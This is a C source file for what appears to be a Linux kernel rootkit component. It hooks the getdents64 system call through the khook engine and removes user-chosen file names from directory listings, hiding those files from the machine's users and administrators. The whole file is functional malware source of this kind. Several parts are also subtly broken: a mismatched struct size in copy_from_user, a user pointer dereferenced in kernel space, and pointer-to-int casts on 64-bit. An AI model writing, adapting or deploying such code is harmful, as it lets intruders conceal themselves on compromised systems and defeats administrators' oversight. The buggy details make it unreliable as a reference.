#include "../khook/engine.h"
#include "../protocol.h"
#include "file_hiding.h"

#include <linux/dirent.h>
#include <linux/uaccess.h> // copy_from_user
#include <linux/cred.h>
#include <linux/slab.h>

static char hidden_names[128][128];
static char hidden_dir_names[128][128];
static unsigned int hidden_names_length = 0;
static unsigned int hidden_dir_names_length = 0;

static char PREFIX[128];

int pid;

static int hide_file(char *name) {
    strncpy_from_user(PREFIX, name, 128);
    int dir_name_length;
    char *name_in_kernel;
    int i = 0;
    if (hidden_names_length >= 128) {
        return 1;
    }
    strncpy_from_user(hidden_names[hidden_names_length++],name,128);
    name_in_kernel = hidden_names[hidden_names_length - 1];
    dir_name_length = strlen(name_in_kernel);
    while (dir_name_length >= 0) {
        if (name_in_kernel[dir_name_length] == '/') {
            dir_name_length--;
            break;
        }
        dir_name_length--;
    }
    for (i = 0; i < dir_name_length; i++) {
        hidden_dir_names[hidden_dir_names_length][i] = name_in_kernel[i];
    }
    hidden_dir_names[hidden_dir_names_length++][dir_name_length] = '\0';

    return 0;
}

int handle_file_hiding_request(void *raw_subargs) {
    struct FileHidingSubargs subargs;
    if (copy_from_user(&subargs, (void *)raw_subargs, sizeof(struct ProcessHidingSubargs)) != 0) {
        // copy failed
        goto err;
    }
    if (hide_file(subargs.name) != 0) {
        // process hide failed
        goto err;
    }
    return 0;

    err:
    return 1;
}

KHOOK_EXT(int, __x64_sys_getdents64, unsigned int, struct linux_dirent64 *, unsigned int);
int khook___x64_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
    int rtn;
    struct linux_dirent64 *cur = dirent;
    int i = 0;
    int is_target_dir = 0;
    rtn = KHOOK_ORIGIN(__x64_sys_getdents64, fd, dirent, count);
    for (i = 0; i < hidden_dir_names_length; i++) {
        if (strcmp(dirent->d_name, hidden_dir_names[i]) == 0) {
            is_target_dir = 1;
            break;
        }
    }
    if (!is_target_dir) {
        return rtn;
    }
    i = 0;
    while (i < rtn) {
        int j;
        int find_target = 0;
        for (j = 0; j < hidden_names_length; j++) {
            if (strncmp(cur->d_name, hidden_names[j], strlen(hidden_names[j])) == 0) {
                // is the file we want to hide
                int reclen = cur->d_reclen;
                char *next_rec = (char *)cur + reclen;
                int len = (int)dirent + rtn - (int)next_rec;
                memmove(cur, next_rec, len);
                rtn -= reclen;
                find_target = 1;
                break;
            }
        }
        if (find_target) {
            continue;
        }
        i += cur->d_reclen;
        cur = (struct linux_dirent64 *)((char *)dirent + i);
    }
    return rtn;
}
